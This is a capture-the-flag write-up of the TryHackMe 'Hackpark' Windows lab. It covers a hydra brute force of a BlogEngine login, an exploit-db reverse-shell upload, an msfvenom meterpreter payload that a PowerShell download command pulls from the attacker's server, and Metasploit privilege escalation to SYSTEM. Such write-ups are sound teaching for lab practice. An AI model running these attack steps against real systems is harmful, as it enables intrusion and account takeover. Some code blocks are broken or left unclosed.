# TryHackMe - Hackpark
_________________________

[Hackpark](https://tryhackme.com/room/hackpark) is a room on the offensive pentesting path on TryHackMe. I'm excited to do this writeup, regardless of the fact there are already so many, because this is a Windows machine. While I thoroughly enjoy doing Linux boxes, I recognize that the majority of the world has not adopted linux. Windows boxes are going to be more useful to me professionally. As usual, I've gone ahead and made a directory named `hackpark` as well as making an `nmap` directory.

## nmap Scan  

```

Looks like we have a website hosted on port 80. It also appears that we have some disallowed entries in `robots.txt`. I'm going to run `gobuster` to enumerate the directories while I take a look at the page to see what that looks like.

## Web Enumeration  

Here's the homepage of the hackpark website:
<br>
<br>

<br>
<br>

Looks like `pennywise` is the clown on the homepage. Taking a look around it seems that there is an `administrator` account, and the webpage is running a CMS called `blogengine`. `Gobuster` is also giving us a ton of directories so I stopped it early, but the one I'm most interested in is called `admin`.

This is the page we want. As I stated before there appears to be an `administrator` account, but I'll try using `admin` for the username. I'll be using hydra to brute force the page. I still sometimes get tripped up by the syntax of using hydra on a webpage so I'll go into some more detail here about how I came up with the command. We're looking for weak passwords in this instance so the wordlist that I'll use is `rockyou.txt`. Here's the general syntax when using hydra to brute force a web login.  
<br>
<br>

`
hydra -l <username> -p <password list> <IP Address> http-form-post <login page:request headers:failed login message>
`
<br>
<br>
As I said before I'll be using the username `admin` and the password list rockyou.txt. The parameters can be found a few ways, but the easiest is in burp suite. Type in any username and password, then look at where the POST request is getting sent to, in our case, it's `/Account/login.aspx`. We'll type that into the `login page` of our command. Then find the headers by looking at the bottom of the request where it starts with `__VIEWSTATE...` and replace your username with `^USER^` and password with `PASS`, then copy and paste that into the command as the `request headers`. Finally send the request through and see that the failed login says `Login failed` and type that into the `failed login message`. The BurpSuite window you need and the end result should look something like this:
<br>
<br>

## Foothold  

Now that we're in the admin dashboard, we can start to take a look around and see what we're working with here. Visiting the about page gives us a good idea about the CMS that we have. With that information we can do some research on exploits that we might be able to use.
<br>
<br>

![](assets/images/hackpark/hackpark_blog.png)
<br>
<br>

Using a quick google search shows us that the CMS has a known vulnerability we can exploit on [exploit-db](https://www.exploit-db.com/exploits/46353). The exploit gives us good instructions on how to compromise the machine. First we navigate to `/admin/app/editor/editpost.cshtml` on our machine. Then we need to click on the file icon on the top right of our post window, this will allow us to upload our exploit. Once we've made sure that we've changed the ip and port number of the exploit, we have to upload our exploit as `PostView.ascx`.
<br>
<br>

![](assets/images/hackpark/hackpark_upload.png)
<br>
<br>

Now we set a netcat listener on our attacking machine, and navigate to `?theme=../../App_Data/files` on our victim website to trigger the exploit.
<br>
<br>

![](assets/images/hackpark/hackpark_initial.png)
<br>
<br>

## Upgrading the Shell  

The next step is to upgrade our shell. I'll be using metasploit for this shell upgrade. We can use powershell to upload a `msfvenom` payload and connect with the `multi/handler` on metasploit. You can find a good amount of `msfvenom` commands [here](https://netsec.ws/?p=331). Here's my command:
<br>
<br>


`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe`
<br>
<br>

The next step is to upload our payload to the victim machine. I'll first spin up a webserver in the directory with my payload using `python3 -m http.server` I'm sure there's a command we can use striaght from the command prompt, but I'm going to upload it with powershell in the `C:\Windows\Temp` folder. After navigating to the proper directory, here's the command for the file upload:
<br>
<br>

`powershell Invoke-WebRequest http://<your-ip>:8000/<payload> -OutFile <payload-name>`
<br>
<br>

Once the file's been uploaded, we need to set up metasploit. Type `use multi/handler` and set the `LHOST` and `LPORT` values to the same values in the payload. Be sure to set your payload as `windows/meterpreter/reverse_tcp` as well. Then run the exploit with `run`. Metasploit will listen for the payload. Switch over to the victim machine and simply run the payload, which in my case is simply `shell.exe`.
<br>
<br>

![](assets/images/hackpark/hackpark_meterpreter.png)
<br>
<br>

We now have a meterpreter shell on our victim machine.
<br>
<br>

## Privilege Escalation

One of the many cool things about metasploit is that it can automate the escalation process for us by typing `run post/multi/recon/local_exploit_suggester`. This runs through a bunch of known local exploits and sees what our victim might be vulnerable to.
<br>
<br>

![](assets/images/hackpark/hackpark_privesc.png)
<br>
<br>

Of these exploits, I like the look of the one at the bottom the most. So Here's the general flow of my commands to get this exploit running:

```
meterpreter >
Background session 2? [y/N]  
msf6 exploit(multi/handler) > use exploit/windows/local/ms16_075_reflection_juicy

<br>

## Flags

And of course, now that we're the `nt authority\system` user, we can grab our flags.

![](assets/images/hackpark/hackpark_flags.png)

As for the remaining odd questions the room has we can get that info with `sysinfo` as well as by using `winpeas` to see what the suspicious service and binary are.
